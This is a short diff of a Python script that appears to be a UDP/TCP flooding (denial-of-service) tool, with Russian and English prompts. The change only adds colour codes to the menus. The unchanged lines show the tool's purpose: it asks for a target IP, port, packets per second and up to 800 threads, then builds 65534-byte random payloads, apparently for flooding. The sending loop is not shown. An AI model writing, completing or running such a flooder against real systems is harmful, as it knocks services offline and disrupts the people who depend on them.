@@ -6,6 +6,14 @@ import sys
 import time
 import ssl
 import datetime
+#Colour
+yellow='\033[93m'
+gren='\033[92m'
+cyan='\033[96m'
+pink='\033[95m'
+red='\033[91m'
+b='\033[1m'
+##############
 
 os.system("clear")
 
@@ -21,23 +29,23 @@ print("""\033[93m
 """)
 time.sleep(2)
 print()
-choice = str(input("╠═══[ МЕТОД [×] METHODS [UDP/TCP] ] •\n╚══> "))
+choice = str(input("\033[94m ╠═══[ МЕТОД [×] METHODS [UDP/TCP] ] •\n╚══> \033[1m"))
 time.sleep(1)
 os.system('cls' if os.name=='nt' else 'clear')
 print(banner)
-ip = str(input("╠═══[ Ваша Цель IP ] •\n╚══> "))
+ip = str(input("\033[94m ╠═══[ Ваша Цель IP ] •\n╚══> \033[1m"))
 time.sleep(1)
 os.system('cls' if os.name=='nt' else 'clear')
 print(banner)
-port = int(input("╠═══[ ПОРТ [×] PORT ] •\n╚══> "))
+port = int(input("\033[94m ╠═══[ ПОРТ [×] PORT ] •\n╚══> \033[1m"))
 time.sleep(1)
 os.system('cls' if os.name=='nt' else 'clear')
 print(banner)
-times = int(input("╠═══[ ПАКЕТЫ/s [×] PACKETS ] •\n╚══> "))
+times = int(input("\033[94m ╠═══[ ПАКЕТЫ/s [×] PACKETS ] •\n╚══> \033[1m"))
 time.sleep(1)
 os.system('cls' if os.name=='nt' else 'clear')
 print(banner)
-threads = int(input("╠═══[ ПОТОКИ [800] THREADS ] •\n╚══> "))
+threads = int(input("\033[94m ╠═══[ ПОТОКИ [800] THREADS ] •\n╚══> \033[1m"))
 
 def run():
   data = random._urandom(65534)
